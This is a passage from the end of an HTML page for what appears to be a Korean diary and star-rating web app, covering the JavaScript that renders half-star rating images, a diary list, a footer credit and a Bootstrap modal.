            <img src="/src/rate_star_after_half-left.png" height="30" width="15" onclick="set(8,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="30" width="15" onclick="set(9,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">`
                        case 9: return `
            <img src="/src/rate_star_after_half-left.png" height="30" width="15" onclick="set(0,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="30" width="15" onclick="set(1,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="30" width="15" onclick="set(2,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="30" width="15" onclick="set(3,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="30" width="15" onclick="set(4,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="30" width="15" onclick="set(5,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="30" width="15" onclick="set(6,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="30" width="15" onclick="set(7,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="30" width="15" onclick="set(8,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="30" width="15" onclick="set(9,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">`
                        default:
                            break
                    }
                }
                init()
            </script>
            <!-- Button trigger modal -->
            <ul class="list-group list-group-flush" id="diary-list" style="max-height: 300px; overflow-y: auto;">

            </ul>
        </div>
    </main>
    <footer class="mastfoot mt-auto">
        <div class="inner">
            <p>Created by<a href="http://ssossotable.com"> ssosso.table</a>, by <a href="http://ssossotable.com">@ssosso.table</a></p>
        </div>
    </footer>

</div>

<!-- Modal -->
<div id="modal-layout">
    <div class="modal fade" id="recordModal" tabindex="-1" aria-labelledby="recordModalLabel" aria-hidden="true">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <h1 class="modal-title fs-5" id="recordModalLabel">다이어리</h1>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <div class="modal-body" id="modal-content">
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                </div>
            </div>
        </div>
    </div>
</div>


<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
</body></html>